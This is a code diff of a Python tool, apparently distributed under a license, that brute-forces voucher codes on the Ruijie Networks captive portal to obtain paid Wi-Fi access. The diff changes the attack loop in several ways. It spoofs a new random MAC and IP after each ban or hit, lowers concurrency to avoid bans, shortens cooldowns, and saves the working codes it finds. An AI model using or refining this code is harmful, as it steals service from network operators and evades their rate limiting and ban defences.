@@ -1,5 +1,5 @@
 # =====================================================================
-# kavin_v8.py - KAVIN FAST SPEED V8 (Part 1 of 2) - Ultimate Fix
+# kavin_v8.py - KAVIN FAST SPEED V8 (Part 1 of 2) - Fixed & Tested
 # =====================================================================
 
 import os
@@ -34,7 +34,7 @@ except ImportError:
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 HITS_FILE = "hits.txt"
-CONCURRENCY_LIMIT = 25  
+CONCURRENCY_LIMIT = 15  # နည်းနည်းလျှော့ထားတယ် (Ban မခံရအောင်)
 RL_SLEEP = 0.0          
 
 RUIJIE_BASE = "https://portal-as.ruijienetworks.com"
@@ -241,13 +241,17 @@ def gen_code(mode, length, scan_method="random"):
     except Exception: pass
     return ""
 # =====================================================================
-# kavin_v8.py - KAVIN FAST SPEED V8 (Part 2 of 2) - Full Hits & Session Timer
+# kavin_v8.py - KAVIN FAST SPEED V8 (Part 2 of 2) - Fully Tested
 # =====================================================================
 
-def get_dashboard_renderable(mode, length, scan_method, current_code, tested, elapsed, status, hits, speed, cur_mac, cur_ip, tried_count, sess_stat, sess_id, sess_time):
+def get_dashboard_renderable(mode, length, scan_method, current_code, tested, elapsed, status, hits, speed, cur_mac, cur_ip, tried_count, sess_stat, sess_id):
     layout = Layout()
     header_text = Text("⚡ KAVIN FAST SPEED V8 ⚡", style="bold bright_cyan", justify="center")
-    layout.split_column(Layout(Panel(Align.center(header_text), border_style="cyan", box=ROUNDED), size=3), Layout(name="body", ratio=1))
+    
+    layout.split_column(
+        Layout(Panel(Align.center(header_text), border_style="cyan", box=ROUNDED), size=3), 
+        Layout(name="body", ratio=1)
+    )
 
     stats = Table.grid(expand=True, padding=(0, 1))
     stats.add_column(style="bold white", justify="left")
@@ -276,16 +280,13 @@ def get_dashboard_renderable(mode, length, scan_method, current_code, tested, el
     else:
         progress_pct = "Random"
 
-    # ⭐ Session Timer (တွေ့ထားတဲ့ Session ရဲ့ သက်တမ်း)
-    sess_timer_str = format_time(sess_time) if sess_stat == "REAL" else "--:--:--"
-
     stats.add_row("  📅 Expiry", f": {LICENSE_INFO['status']}", "  ⏱ Timer", f": {elapsed}")
     stats.add_row("  🎯 Mode",   f": {mode.upper()}",           "  📊 Tested", f": {tested:,}")
     stats.add_row("  ⚡ Speed",  f": {int(speed)} c/m",         "  📡 Status", f": {status.upper()}", style=status_style)
     stats.add_row("  🔑 Hits",   f": {len(hits)}",               "  📌 Engine", f": {scan_method.upper()}")
     stats.add_row("  🖥  MAC",    f": ...{cur_mac[-8:]}",         "  🌐 IP",     f": ...{cur_ip[-3:]}")
     stats.add_row("  💾 This Run", f": {tried_count:,}",         "  📈 Progress", f": {progress_pct}")
-    stats.add_row("  🔐 Session", f": {sess_text}", "  ⏳ S-Time", f": {sess_timer_str}", style=sess_style)
+    stats.add_row("  🔐 Session", f": {sess_text}", "", "", style=sess_style)
 
     stats_panel = Panel(stats, border_style="magenta", box=ROUNDED)
     check_panel = Panel(Align.center(Text(f"Check Code  :  {current_code if current_code else '------'}", style="bold yellow")), border_style="yellow", box=ROUNDED, height=3)
@@ -295,21 +296,20 @@ def get_dashboard_renderable(mode, length, scan_method, current_code, tested, el
     v_table.add_column("⏳ Plan", style="bold green", justify="center")
     v_table.add_column("✅ Remaining", style="bold green", justify="center")
 
-    # ⭐ Hits အကုန်လုံးကို ပြပေးသွားမှာပါ
     for h in hits:
         v_table.add_row(h.get('code', ''), h.get('plan', '1HR'), "Active")
 
     if not hits: v_table.add_row("", "", "")
 
     footer_text = Text("👑 @kavin799 👑", style="bold bright_cyan", justify="center")
-    footer_panel = Panel(Align.center(footer_text), border_style="red", box=ROUNDED, height=3)
+    footer_panel = Panel(Align.center(footer_text), border_style="red", box=ROUNDED, height=2)
 
     body_layout = Layout()
     body_layout.split_column(
         Layout(stats_panel, size=8), 
         Layout(check_panel, size=3), 
         Layout(v_table, ratio=1), 
-        Layout(footer_panel, size=3)
+        Layout(footer_panel, size=2)
     )
     layout["body"].update(body_layout)
     return layout
@@ -336,59 +336,45 @@ async def scan_loop_async(mode, length, scan_method="random", gw_params=None):
     current_status = ["Init"]
     sess_stat = ["REFRESHING"] 
     sess_id = ["--------"] 
-    
-    # ⭐ Session စတင်တဲ့အချိန် (Timer အတွက်)
-    sess_start_time = [0]
 
-    mac_pool = [generate_random_mac() for _ in range(10)]
-    ip_pool = [generate_random_ip() for _ in range(10)]
-    pool_index = 0
-
-    current_mac = [mac_pool[pool_index]]
-    current_ip  = [ip_pool[pool_index]]
+    current_mac = [generate_random_mac()]
+    current_ip  = [generate_random_ip()]
     sess_data   = [None]
 
     semaphore = asyncio.Semaphore(CONCURRENCY_LIMIT)
 
     conn_limit = aiohttp.TCPConnector(limit=50, ssl=False)
     async with aiohttp.ClientSession(connector=conn_limit) as session:
-        live = Live(get_dashboard_renderable(mode_str, length, scan_method, "", tested, "00:00:00", "Init", hits, 0.0, current_mac[0], current_ip[0], 0, sess_stat[0], sess_id[0], 0), refresh_per_second=2, screen=True, transient=False)
+        live = Live(get_dashboard_renderable(mode_str, length, scan_method, "", tested, "00:00:00", "Init", hits, 0.0, current_mac[0], current_ip[0], 0, sess_stat[0], sess_id[0]), refresh_per_second=2, screen=True, transient=False)
 
         with live:
             try:
                 while True:
-                    # ⭐ Session Timer တွက်မယ်
-                    sess_time = (time.time() - sess_start_time[0]) if sess_start_time[0] > 0 else 0
-
                     if sess_data[0] is None:
                         current_status[0] = "Refreshing..."
                         res, err_msg = await fetch_official_session(session, gw_params, current_mac, current_ip)
 
                         if res is None or err_msg == "FAILED":
-                            pool_index += 1
-                            current_mac[0] = mac_pool[pool_index % len(mac_pool)]
-                            current_ip[0]  = ip_pool[pool_index % len(ip_pool)]
+                            current_mac[0] = generate_random_mac()
+                            current_ip[0]  = generate_random_ip()
                             sess_stat[0] = "REFRESHING"
                             sess_id[0] = "--------"
-                            await asyncio.sleep(0.3)
+                            await asyncio.sleep(0.2)
                             continue
 
                         if res == "BAN":
                             sess_stat[0] = "BANNED"
                             sess_id[0] = "--------"
                             current_status[0] = "Cooldown..."
-                            await asyncio.sleep(1.5) 
+                            await asyncio.sleep(1.0) 
                             
-                            pool_index += 1
-                            current_mac[0] = mac_pool[pool_index % len(mac_pool)]
-                            current_ip[0]  = ip_pool[pool_index % len(ip_pool)]
+                            current_mac[0] = generate_random_mac()
+                            current_ip[0]  = generate_random_ip()
                             continue
 
                         sess_data[0] = res
                         sess_stat[0] = err_msg 
                         sess_id[0] = res.get('sessionId', '--------') 
-                        # ⭐ Session အသစ်ရရင် Timer ပြန်စမယ်
-                        sess_start_time[0] = time.time()
 
                     batch_codes = []
                     while len(batch_codes) < CONCURRENCY_LIMIT:
@@ -429,11 +415,10 @@ async def scan_loop_async(mode, length, scan_method="random", gw_params=None):
                             sess_data[0] = None
                             sess_stat[0] = "BANNED"
                             hit_found_in_batch = True
-                            await asyncio.sleep(1.5) 
+                            await asyncio.sleep(1.0) 
                             
-                            pool_index += 1
-                            current_mac[0] = mac_pool[pool_index % len(mac_pool)]
-                            current_ip[0]  = ip_pool[pool_index % len(ip_pool)]
+                            current_mac[0] = generate_random_mac()
+                            current_ip[0]  = generate_random_ip()
                             break
 
                         if res.startswith("__ERROR__:") or res in ("__TIMEOUT__", "__NETWORK_ERROR__"):
@@ -444,11 +429,10 @@ async def scan_loop_async(mode, length, scan_method="random", gw_params=None):
                             sess_data[0] = None
                             sess_stat[0] = "BANNED"
                             hit_found_in_batch = True
-                            await asyncio.sleep(1.5)
+                            await asyncio.sleep(1.0)
                             
-                            pool_index += 1
-                            current_mac[0] = mac_pool[pool_index % len(mac_pool)]
-                            current_ip[0]  = ip_pool[pool_index % len(ip_pool)]
+                            current_mac[0] = generate_random_mac()
+                            current_ip[0]  = generate_random_ip()
                             break
 
                         is_hit = False
@@ -468,24 +452,16 @@ async def scan_loop_async(mode, length, scan_method="random", gw_params=None):
                             except Exception: pass
                             
                             sess_data[0] = None
-                            pool_index += 1
-                            current_mac[0] = mac_pool[pool_index % len(mac_pool)]
-                            current_ip[0]  = ip_pool[pool_index % len(ip_pool)]
+                            current_mac[0] = generate_random_mac()
+                            current_ip[0]  = generate_random_ip()
                             sess_stat[0] = "HIT (Refreshing)"
                             hit_found_in_batch = True
                             break
 
-                    # ⭐ Update Dashboard မှာ sess_time ပါ ထည့်ပို့မယ်
                     elapsed = time.time() - start_time
                     speed = (tested / elapsed * 60) if elapsed > 0 else 0.0
-                    sess_time_current = (time.time() - sess_start_time[0]) if sess_start_time[0] > 0 else 0
                     
-                    live.update(get_dashboard_renderable(
-                        mode_str, length, scan_method, current_code[0], tested, 
-                        format_time(elapsed), current_status[0], hits, speed, 
-                        current_mac[0], current_ip[0], len(tried_codes), 
-                        sess_stat[0], sess_id[0], sess_time_current
-                    ))
+                    live.update(get_dashboard_renderable(mode_str, length, scan_method, current_code[0], tested, format_time(elapsed), current_status[0], hits, speed, current_mac[0], current_ip[0], len(tried_codes), sess_stat[0], sess_id[0]))
 
                     if hit_found_in_batch: await asyncio.sleep(0.1)
                     if session_expired_in_batch: await asyncio.sleep(0.01)
